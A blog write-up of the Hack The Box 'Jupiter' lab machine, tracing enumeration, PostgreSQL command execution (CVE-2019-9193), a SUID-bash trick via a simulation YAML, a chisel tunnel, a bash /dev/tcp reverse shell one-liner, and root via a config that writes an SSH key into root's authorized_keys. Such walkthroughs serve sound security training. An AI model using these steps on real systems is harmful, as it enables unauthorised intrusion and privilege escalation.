---
title: HTB Jupyter
author: hanhctf
date: 2023-06-20 00:22:22 +0700
categories: [Write-up, HTB]
tags: [jupyter]
toc: true
mermaid: true
---

# [**Jupiter**](https://www.hackthebox.comachievement/machine/108910/545)

## NMAP

```shell
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEJSyKmXs5CCnonRCBuHkCBcdQ54oZCUcnlsey3u2/vMXACoH79dGbOmIHBTG7/GmSI/j031yFmdOL+652mKGUI=
|   256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHhClp0ailXIfO0/6yw9M1pRcZ0ZeOmPx22sO476W4lQ
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://jupiter.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Foothold

First off all, We see 2 ports are open(`22` for SSH, `80` for HTTP)
And `Did not follow redirect to http://jupiter.htb/` --> add domain-name to `/etc/hosts`

### Enumeration

1.Use `ffuf` to find directory --> non lucky, no interesting

```shell
ffuf -u 'http://jupiter.htb/FUZZ' -w /opt/SecLists/Discovery/Web-Content/big.txt
```  

2.Use `ffuf` to fuzz VHOST.

```shell
ffuf -u 'http://jupiter.htb' -H "Host: FUZZ.jupiter.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 178
```

==> `http://kiosk.jupiter.htb`  

3.Use `ffuf` fuzz on kiosk  

```shell
ffuf -u 'http://kiosk.jupiter.htb/api/FUZZ' -w /opt/SecLists/Discovery/Web-Content/big.txt -recursion
```  

--> Nothing interest.

4.Check request on BurpSuite.  
Have a post request on `/api/query`  
![](/commons/HTB/Jupiter/0_burp.png)

### Exploit

==> Send to Repeater.  
In header, we see `x-plugin-id: postgres` ==> website use PostgresSQL
Check version of Postgres.  
![](/commons/HTB/Jupiter/1_sqlver.png)

We can execute PostgresSQL command. After check, nothing found.  
After research PostgresSQL ==> CVE-2019-9193 and [this blog](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)

```text
1) [Optional] Drop the table you want to use if it already exists

DROP TABLE IF EXISTS cmd_exec;

2) Create the table you want to hold the command output

CREATE TABLE cmd_exec(cmd_output text);

3) Run the system command via the COPY FROM PROGRAM function

COPY cmd_exec FROM PROGRAM ‘id’;

4) [Optional] View the results

SELECT * FROM cmd_exec;

5) [Optional] Clean up after yourself

DROP TABLE IF EXISTS cmd_exec;
```

After exec command in `Repeater`, we get shell with user `postgres`
![](/commons/HTB/Jupiter/2_shell.png)

With `linpeas.sh`, nothing.
See `pspy` someting interested.  
![](/commons/HTB/Jupiter/3_pspy.png)

After review `network-simulation.yml` we can edit it to get shell from `juno`
We can not use `vim` or `nano` on shell, so we create a file .yml on local and put in attack machine with `wget` or `curl` or anything else we can.  

```yml
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /usr/bin/bash /tmp/user
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/chmod
      args: u+s /tmp/user
      start_time: 5s

```

After put in attack machine ==> use `cp` to force edit default file `network-semulation.yml` (**I still don't know why payload can not run with diffrent name .yml :(**)

```shell
cp -f asd.yml network-simulation.yml
```

OK, wait and get `user` that have SUID of `juno` in /tmp.
![](/commons/HTB/Jupiter/4_juno.png)

## User Priv

In `juno` home, add your own `id_rsa.pub` to `/home/juno/.ssh/authorized_keys`

SSH login with user `juno`.  
Upload `linpeas.sh` and check.  

We see `jovian` run `jupyter-notebook` file in `/opt/solar-flares/`

Check dir `/opt/solar-flares`.

See lastest .log  
![](/commons/HTB/Jupiter/5_log.png)

`Juniper-notebook` run on port 8888 on localhost.  
We will use [chisel](https://github.com/jpillora/chisel)  

On local run server: `./chisel64 server --port 4444 --reverse`
On attack machine runs client: `./chisel64 client IP:PORT R:8888:127.0.0.1:8888`  
![](/commons/HTB/Jupiter/6_chisel.png)

Add reverse shell on `flares.ipynb` and get user `jovian`

```shell
import os;os.system('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"')
```

We in `jovian`shell.

Run `linpeas.sh` again :)

we see we can run `sudo /usr/local/bin/sattrack` without password.

![](/commons/HTB/Jupiter/8_sudo.png)

After enumeration, we can find file config of sattrack in `/usr/local/share/sattrack/`.

Look at `config.json`,

```json
{
        "tleroot": "/tmp/tle/",
        "tlefile": "weather.txt",
        "mapfile": "/usr/local/share/sattrack/map.json",
        "texturefile": "/usr/local/share/sattrack/earth.png",

        "tlesources": [
                "http://celestrak.org/NORAD/elements/weather.txt",
                "http://celestrak.org/NORAD/elements/noaa.txt",
                "http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"
        ],

        "updatePerdiod": 1000,

        "station": {
                "name": "LORCA",
                "lat": 37.6725,
                "lon": -1.5863,
                "hgt": 335.0
        },

        "show": [
        ],

        "columns": [
                "name",
                "azel",
                "dis",
                "geo",
                "tab",
                "pos",
                "vel"
        ]
}
```

So we can edit it to add `id_rsa.pub` to `authorized_keys` of `root`.

1.Copy `config.json` to `/tmp`
2.Save us own `id_rsa.pub` in file `authorized_keys`
3.run http server `python3 -m http.server 80`
4.Edit file `/tmp/config.json`

```json
{
        "tleroot": "/root/.ssh/",
        "tlefile": "authorized_keys",
        "mapfile": "/usr/local/share/sattrack/map.json",
        "texturefile": "/usr/local/share/sattrack/earth.png",

        "tlesources": [
                "http://localIP:PORT/authorized_keys",
                "http://celestrak.org/NORAD/elements/noaa.txt",
                "http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"
        ],

        "updatePerdiod": 1000,

        "station": {
                "name": "LORCA",
                "lat": 37.6725,
                "lon": -1.5863,
                "hgt": 335.0
        },

        "show": [
        ],

        "columns": [
                "name",
                "azel",
                "dis",
                "geo",
                "tab",
                "pos",
                "vel"
        ]
}
```

![](/commons/HTB/Jupiter/9_root.png)
